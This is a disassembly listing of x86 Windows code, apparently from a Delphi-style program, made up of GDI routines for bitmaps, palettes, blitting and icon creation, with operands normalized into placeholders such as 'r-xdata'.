call sub_4207ac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420bd0
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4207ac
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420bd7
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4207ac
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420a23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_4069e8
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420bd7
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_420be4
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_420c1c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b78
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_420c94
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_420cec
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_402930
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420de9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420df0
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_420e04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_420e8a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_420e9c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_402930
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_420c94
mov eax esp
call sub_420e04
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_420f40
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_420c94
mov [ esp ] eax
sub_420f94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_42093c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_42091c
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_421140
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4207ac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421066
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4207bc
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42106d
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_4206b0
sub_42106d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_42093c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4207ac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421120
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_4207bc
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421127
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_42115c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4211ec
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b34
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4214e3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_4212d5
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_4206b0
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212dc
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4212dc
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_421150
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407b34
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_4214c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_420f94
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407b34
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_4214a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4214a7
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402754
retn
call sub_420704
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_421150
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_42115c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4214f4
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_420698
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b78
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_42093c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4215d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4214f4
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_421644
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4214f4
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4216e1
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4216e8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_421718
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b78
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b78
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_42170c
xor edx edx
push ebp
push sub_421906
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4215d8
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4215d8
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4218df
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407b34
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407b34
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407b34
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b34
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_421644
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_421644
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218e6
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402754
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402754
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402754
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402754
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4218e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42190d
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_421914
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_421964
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov al 0x1
